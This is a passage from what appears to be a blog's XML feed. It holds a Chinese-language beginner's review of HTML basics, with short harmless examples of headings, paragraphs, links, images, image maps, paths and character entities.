<br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;selected&quot;</span>&gt;</span>香蕉<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>樱桃<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;comment&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-12-实体"><a href="#6-12-实体" class="headerlink" title="6.12 实体"></a>6.12 实体</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">&lt; 等同于 <span class="hljs-symbol">&amp;lt;</span><br>&gt; 等同于 <span class="hljs-symbol">&amp;gt;</span><br>© 等同于 <span class="hljs-symbol">&amp;copy;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML基础知识复习（一）</title>
    <link href="/2021/05/05/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/05/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML是用于创建网页的语言。我们通过使用HTML标记标签创建html文档来创建网页。HTML代表超文本标记语言。HTML是一种标记语言，它具有标记标签的集合。<br>HTML标签是由尖括号括起来的词，如&lt;html&gt;， &lt;body&gt;。标签通常成对出现，例如&lt;html&gt;和&lt;/html&gt;。<br>一对中的第一个标签是开始标签;第二个标签是结束标签。在上面的示例中，&lt;html&gt;是开始标签，而&lt;/html&gt;是结束标签。<br>我们还可以将开始标签称为起始标签，结束标签称为闭合标签。<br><strong>注意：</strong>并不是所有的标签都有结束标签的！！！<br><strong>注意：</strong>在本文中，有人民币符号￥的，表示自闭合标签，即不需要结束标签的。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="0-网页基础"><a href="#0-网页基础" class="headerlink" title="0.网页基础"></a>0.网页基础</h2><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>页面标题<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我是第一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ul><li>DOCTYPE声明了文档的类型</li><li>&lt;html&gt;标签是 HTML 页面的根元素，该标签的结束标志为&lt;/html&gt;</li><li>&lt;head&gt;标签包含了文档的元数据（meta），如&lt;meta charset=”utf-8”&gt;定义网页编码格式为utf-8。</li><li>&lt;title&gt;标签定义文档的标题</li><li>&lt;body&gt;标签定义文档的主体，即网页可见的页面内容，该标签的结束标志为&lt;/body&gt;</li><li>&lt;meta&gt; 字符集设置为UTF-8编码。UTF-8是一种常见的字符编码。涵盖了世界上几乎所有的字符和符号。HTML5的默认字符编码为UTF-8。</li></ul></blockquote><h2 id="1-标题（-lt-h-gt-）"><a href="#1-标题（-lt-h-gt-）" class="headerlink" title="1.标题（&lt;h&gt;）"></a>1.标题（&lt;h&gt;）</h2><p>HTML 标题（Heading）是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的。<br>六个标题元素，每个元素代表文档中不同级别的内容：<br>&lt;h1&gt; 表示主标题（ the main heading ），&lt;h2&gt; 表示二级子标题（ subheadings ），&lt;h3&gt;表示三级子标题（ sub-subheadings ），&lt;h4&gt;、&lt;h5&gt;、&lt;h6&gt;字体的大小依次递减。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是标题1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是标题2<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是标题3<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>这是标题4<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span>这是标题5<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>这是标题6<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-段落（-lt-p-gt-）"><a href="#2-段落（-lt-p-gt-）" class="headerlink" title="2.段落（&lt;p&gt;）"></a>2.段落（&lt;p&gt;）</h2><p>HTML 段落是通过标签&lt;p&gt;来定义的，P是英文paragraph段落的缩写，经常被用来创建一个段落。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是另外一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-空格（-amp-nbsp-）"><a href="#3-空格（-amp-nbsp-）" class="headerlink" title="3.空格（&amp;nbsp;）"></a>3.空格（&amp;nbsp;）</h2><p>无论你用了多少空格（包括空格字符，包括换行），当渲染这些代码的时候，HTML 解释器会将连续出现的空格字符减少为一个单独的空格符，这样做的目的就是为了可读性。</p><p>下面的两个代码片段是等价的，实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗 很 呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗        很<br><br>       呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>如果非要用多个空格的话，可以用 &nbsp; 表示空格，这样写的多个空格会全部表示出来。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗 很 呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗  <span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>很<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>这样的用法，上面的两个代码片段的效果不是一样的。</p><h2 id="4-注释（）"><a href="#4-注释（）" class="headerlink" title="4.注释（）"></a>4.注释（<!--注释内容-->）</h2><p>注释是关于 HTML 元素的有用信息。注释使 HTML 文档更易读和可理解。<br>HTML 中的注释以标签&lt;！– 开头，并以 –&gt; 结尾。<br>浏览器将忽略您在这些标记中放置的任何内容。</p><h2 id="5-元素嵌套"><a href="#5-元素嵌套" class="headerlink" title="5.元素嵌套"></a>5.元素嵌套</h2><p>大多数 HTML 元素可以嵌套（可以包含其他 HTML 元素）。HTML 文档由嵌套的 HTML 元素构成。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is my first paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!--这是注释内容--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-链接（-lt-a-gt-）"><a href="#6-链接（-lt-a-gt-）" class="headerlink" title="6.链接（&lt;a&gt;）"></a>6.链接（&lt;a&gt;）</h2><p>HTML 链接是通过标签&lt;a&gt;来定义的。a标签，也叫anchor（锚点）元素，既可以用来链接到外部地址实现页面跳转功能，也可以链接到当前页面的某部分实现内部导航功能。在<code>href</code>属性中指定链接的地址。</p><h3 id="6-1链接外部"><a href="#6-1链接外部" class="headerlink" title="6.1链接外部"></a>6.1链接外部</h3><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://tothefor.com/&quot;</span>&gt;</span>这是一个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-comment">&lt;!--这里的链接地址分几种，在后面有记录--&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-2链接内部"><a href="#6-2链接内部" class="headerlink" title="6.2链接内部"></a>6.2链接内部</h3><p>可以创建超链接，使浏览器窗口中的另一个元素进入视图。可以使用CSS样式ID选择器#id创建内部超链接。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#one&quot;</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-comment">&lt;!--必须要让页面能够有滚动效果后才能实现，即让页面能够有下滑的空间--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;one&quot;</span>&gt;</span>This is a test.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>上面的代码用 href 创建了一个超链接 #one 的值。<br>当用户单击链接时，浏览器将在文档中查找元素其 id 属性的值为 one ，并跳转到此位置。如果元素不可见屏幕，浏览器将滚动文档以显示它。<br>如果浏览器不能找到具有所需 id 属性值的元素，它会再次搜索，寻找一个与目标匹配的 name 属性。</p><h3 id="6-3相关属性"><a href="#6-3相关属性" class="headerlink" title="6.3相关属性"></a>6.3相关属性</h3><h4 id="6-3-1-链接打开方式（target）"><a href="#6-3-1-链接打开方式（target）" class="headerlink" title="6.3.1 链接打开方式（target）"></a>6.3.1 链接打开方式（target）</h4><p>默认情况下，浏览器使用显示当前文档的窗口，选项卡或框架显示链接的文档并替换现有文档。即在当前的窗口打开。</p><blockquote><ul><li>_blank - 在新窗口（或选项卡）中打开文档。</li><li>_parent - 打开父框架集中的文档。</li><li>_self - 在当前窗口中打开文档（这是默认行为）。</li><li>_top - 在窗口的整个主体中打开文档。</li><li>&lt;frame&gt; - 在指定的框架中打开文档。</li></ul></blockquote><h2 id="7-图像（-lt-img-gt-）￥"><a href="#7-图像（-lt-img-gt-）￥" class="headerlink" title="7.图像（&lt;img&gt;）￥"></a>7.图像（&lt;img&gt;）￥</h2><p>HTML 图像是通过标签&lt;img&gt;来定义的。使用img元素来为你的网站添加图片，使用src 属性指向一个图片的具体地址。<br>请注意：img元素是自关闭元素，不需要结束标记。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;logonew2.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;206&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;36&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="7-1相关属性"><a href="#7-1相关属性" class="headerlink" title="7.1相关属性"></a>7.1相关属性</h3><h4 id="7-1-1提示信息（alt）"><a href="#7-1-1提示信息（alt）" class="headerlink" title="7.1.1提示信息（alt）"></a>7.1.1提示信息（alt）</h4><p>alt 属性用来为图像定义一串预备的可替换的文本。在浏览器无法载入图像时，替换文本属性告诉读者他们失去的信息。此时，浏览器将显示这个替代性的文本而不是图像。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;boat.gif&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Big Boat&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="7-1-2宽度高度（height、width）"><a href="#7-1-2宽度高度（height、width）" class="headerlink" title="7.1.2宽度高度（height、width）"></a>7.1.2宽度高度（height、width）</h4><p>height（高度）与width（宽度）属性用于设置图像的高度与宽度。属性值默认单位为像素。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Pulpit rock&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;304&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;228&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--如果图像指定了高度宽度，页面加载时就会保留指定的尺寸。如果没有指定图片的大小，加载页面时有可能会破坏HTML页面的整体布局。--&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="7-1-3图像边框（border）"><a href="#7-1-3图像边框（border）" class="headerlink" title="7.1.3图像边框（border）"></a>7.1.3图像边框（border）</h4><p>使用border属性以像素为单位指定边框粗细。厚度为 0 表示图片周围没有边框。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Pulpit rock&quot;</span> <span class="hljs-attr">border</span> = <span class="hljs-string">&quot;3&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="7-1-4图像对齐（align）"><a href="#7-1-4图像对齐（align）" class="headerlink" title="7.1.4图像对齐（align）"></a>7.1.4图像对齐（align）</h4><p>默认情况下，图像在页面中将显示为左侧对齐，可以使用align属性将设置图像的对齐方式：left(左侧)或center(居中)或right(右侧)。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;pulpit.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Pulpit rock&quot;</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>1.假如某个 HTML 文件包含十个图像，那么为了正确显示这个页面，需要加载 11 个文件。</strong><br><strong>2.加载图片是需要时间的。</strong></p><h3 id="7-2图像映射"><a href="#7-2图像映射" class="headerlink" title="7.2图像映射"></a>7.2图像映射</h3><p>创建带有可供点击区域的图像地图。其中的每个区域都是一个超级链接。不同点击有不同的效果。<br>map标签用来定义图像地图。area用来定义图像地图中的可点击区域，即可以在图像上划分区域，这些区域是可以点击的，并且对应不同的操作。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;planets.gif&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;145&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;126&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Planets&quot;</span> <span class="hljs-attr">usemap</span>=<span class="hljs-string">&quot;#planetmap&quot;</span>&gt;</span> <br><br><span class="hljs-tag">&lt;<span class="hljs-name">map</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;planetmap&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">&quot;rect&quot;</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">&quot;0,0,82,126&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Sun&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sun.gif&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">&quot;circle&quot;</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">&quot;90,58,3&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Mercury&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;merglobe.gif&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">area</span> <span class="hljs-attr">shape</span>=<span class="hljs-string">&quot;circle&quot;</span> <span class="hljs-attr">coords</span>=<span class="hljs-string">&quot;124,58,8&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Venus&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;venglobe.gif&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span><br><span class="hljs-comment">&lt;!--三个不同的区域，点击实现不同的效果--&gt;</span><br>其中：<br>coords 属性规定区域的 x 和 y 坐标。与 shape 属性配合使用，来规定区域的尺寸、形状和位置。图像左上角的坐标是(0,0)。<br></code></pre></div></td></tr></table></figure><h2 id="8-链接地址的几种方式"><a href="#8-链接地址的几种方式" class="headerlink" title="8.链接地址的几种方式"></a>8.链接地址的几种方式</h2><p>首先，所建HTML文档T在 C://User/HTML 目录下，并且该目录下还有一张图片A和另一个HTML文档B。</p><h3 id="8-1相对地址"><a href="#8-1相对地址" class="headerlink" title="8.1相对地址"></a>8.1相对地址</h3><p>如果文档T需要用到A或B，可以直接在链接处写A或B的名称（包括后缀名）。如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;A.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;206&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;36&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="8-2绝对地址"><a href="#8-2绝对地址" class="headerlink" title="8.2绝对地址"></a>8.2绝对地址</h3><p>若需要链接其他的，需要写全链接地址，如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;C://User/HTML/A.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;206&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;36&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>如果所需文档或链接等不在本目录下，而在上一目录文件下，则可以用 ../ 来实现访问上一目录，再进入所需要的文件即可。如：在C://User/ 目录下还有一个test文件夹，里面还有一张图片C，则访问它需要 &lt;img src=”../test/C.png” width=”206” height=”36”&gt;  ，这是相对访问，如果用绝对访问，直接写链接即可，即 C://User/test/C.png</strong></p><h3 id="8-3外部链接"><a href="#8-3外部链接" class="headerlink" title="8.3外部链接"></a>8.3外部链接</h3><p>即，可以正常访问的网页等。如：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://tothefor.com/&quot;</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="9-换行（-lt-br-gt-）￥"><a href="#9-换行（-lt-br-gt-）￥" class="headerlink" title="9.换行（&lt;br&gt;）￥"></a>9.换行（&lt;br&gt;）￥</h2><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-水平分割线（-lt-hr-gt-）￥"><a href="#10-水平分割线（-lt-hr-gt-）￥" class="headerlink" title="10.水平分割线（&lt;hr&gt;）￥"></a>10.水平分割线（&lt;hr&gt;）￥</h2><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="11-文字样式"><a href="#11-文字样式" class="headerlink" title="11.文字样式"></a>11.文字样式</h2><h3 id="11-1-lt-strong-gt-与-lt-b-gt"><a href="#11-1-lt-strong-gt-与-lt-b-gt" class="headerlink" title="11.1 &lt;strong&gt; 与 &lt;b&gt;"></a>11.1 &lt;strong&gt; 与 &lt;b&gt;</h3><h3 id="11-2-lt-em-gt-与-lt-i-gt"><a href="#11-2-lt-em-gt-与-lt-i-gt" class="headerlink" title="11.2 &lt;em&gt; 与 &lt;i&gt;"></a>11.2 &lt;em&gt; 与 &lt;i&gt;</h3><blockquote><p>通常标签 &lt;strong&gt; 替换加粗标签 &lt;b&gt; 来使用， &lt;em&gt; 替换 &lt;i&gt;标签使用。<br>然而，这些标签的含义是不同的：<br>&lt;b&gt; 与&lt;i&gt; 定义粗体或斜体文本。<br>&lt;strong&gt; 或者 &lt;em&gt; 意味着你要呈现的文本是重要的，所以要突出显示。</p></blockquote><h3 id="11-3-上标与下标"><a href="#11-3-上标与下标" class="headerlink" title="11.3 上标与下标"></a>11.3 上标与下标</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">这是 <span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span> 下标<span class="hljs-tag">&lt;/<span class="hljs-name">sub</span>&gt;</span> 和 <span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span> 上标<span class="hljs-tag">&lt;/<span class="hljs-name">sup</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="12-实体"><a href="#12-实体" class="headerlink" title="12.实体"></a>12.实体</h2><p>实体是浏览器替换特殊字符的代码。有一些字符在HTML文档中有特殊的含义，例如&lt; 和&gt; 字符。要在内容中使用这些字符而不被解释为HTML，您可以使用HTML实体。</p><p>部分常用实体：<br>| 显示结果 | 描述              | 实体名称 | 实体编号 |<br>| ——– | —————– | ——– | ——– |<br>|          | 空格              | &amp;nbsp;   | &#160;   |<br>| &lt;        | 小于号            | &amp;lt;     | &#60;    |<br>| &gt;        | 大于号            | &amp;gt;     | &#62;    |<br>| &amp;        | 和号              | &amp;amp;    | &#38;    |<br>| ¢        | 分（cent）        | &amp;cent;   | &#162;   |<br>| £        | 镑（pound）       | 